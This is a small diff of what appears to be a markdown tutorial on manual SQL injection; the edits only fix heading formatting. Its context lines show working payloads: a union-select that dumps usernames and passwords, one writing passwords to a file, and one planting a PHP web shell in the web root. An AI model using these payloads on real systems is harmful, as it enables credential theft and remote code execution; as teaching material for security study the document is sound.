@@ -167,7 +167,7 @@ Payload - **?id=-99' union select 1,group_concat(username),group_concat(password
 ![Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Untitled%202.png](Manual%20Error%20based%20SQL%20Injection%20f1dc8dabc2d44afeb963d336e8556235/Untitled%202.png)
 
 
-### SQL Injection to RCE(Remote Code Execution)
+### SQL Injection to RCE (Remote Code Execution)
 
 1. Retrieve data from table user.
 
@@ -193,7 +193,7 @@ Payload- **?id=-99' union select 1,2,password from users into outfile "/tmp/cred
 
 ![SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled%206.png](SQL%20Injection%20to%20RCE%20Remote%20Code%20Execution%208c2959730a1a4ca8966967ded111c688/Untitled%206.png)
 
-### 4. **RCE Payload**
+#### 4. **RCE Payload**
 
 Payload- **?id=-99' union select 1,2,"<?php echo system($_GET['cmd']) ?>" into outfile "/var/www/html/write/shell.php" --+**
 
